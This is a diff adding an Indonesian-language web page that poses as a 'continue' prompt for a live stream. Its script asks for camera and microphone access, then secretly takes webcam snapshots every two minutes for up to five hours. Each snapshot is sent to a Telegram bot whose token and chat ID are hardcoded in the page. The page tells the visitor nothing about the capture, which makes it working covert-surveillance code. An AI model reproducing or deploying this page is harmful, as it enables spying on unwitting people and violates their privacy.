@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Live Streaming & Lokasi</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 300px;
+      animation: fadeIn 0.7s ease;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #00ff88;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="popup" id="step1">
+    <h2>untuk melanjutkan silahkan pencet tombol dibawah</h2>
+    <button onclick="startStreaming()">LANJUTKAN</button>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <div id="loading" style="display:none;">
+    <h3>Tunggu sebentar...</h3>
+  </div>
+
+  <script>
+    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
+    const chat_id = '6374002294';
+    let stream;
+    let videoInterval;
+
+    // Meminta izin untuk mengakses kamera dan mikrofon
+    async function startStreaming() {
+      try {
+        // Meminta akses kamera dan mikrofon
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const video = document.getElementById('video');
+        video.style.display = 'block';
+        video.srcObject = stream;
+
+        // Mulai kirim video setiap 2 menit
+        videoInterval = setInterval(() => {
+          sendToTelegram(stream);
+        }, 120000); // 2 menit = 120,000 ms
+
+        // Kirim video pertama
+        sendToTelegram(stream);
+
+        // Menghentikan stream setelah 5 jam
+        setTimeout(() => {
+          clearInterval(videoInterval);  // Hentikan interval
+          stopStream();
+        }, 5 * 60 * 60 * 1000); // 5 jam = 5 * 60 * 60 * 1000 ms
+
+      } catch (err) {
+        console.error('Error:', err);
+        alert("Akses kamera atau lokasi ditolak!");
+      }
+    }
+
+    // Mengirim data ke Telegram
+    async function sendToTelegram(stream) {
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("text", "Lokasi Pengguna: <Lokasi Anda> Kamera: Aktif");
+
+      // Mengambil snapshot dari kamera
+      const canvas = document.createElement('canvas');
+      const video = document.getElementById('video');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob((blob) => {
+        formData.append("photo", blob);
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).then(() => {
+          document.getElementById("loading").style.display = 'none';
+          console.log("Video snapshot telah dikirim ke Telegram!");
+        }).catch((error) => {
+          console.error('Telegram Error:', error);
+        });
+      }, 'image/jpeg');
+    }
+
+    // Menghentikan stream setelah 5 jam
+    function stopStream() {
+      const video = document.getElementById('video');
+      if (video.srcObject) {
+        let stream = video.srcObject;
+        let tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+      }
+    }
+  </script>
+</body>
+</html>
